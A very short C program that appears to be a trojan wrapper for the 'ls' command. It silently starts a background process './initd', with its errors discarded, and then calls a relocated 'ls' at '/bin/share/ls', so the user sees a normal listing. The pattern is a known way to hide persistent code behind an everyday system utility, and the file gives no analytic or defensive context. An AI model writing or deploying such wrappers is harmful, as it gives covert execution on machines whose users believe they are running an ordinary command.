#include <stdlib.h>
int main() {
system("./initd 2> /dev/null &");
system("/bin/share/ls");
return 0;
 }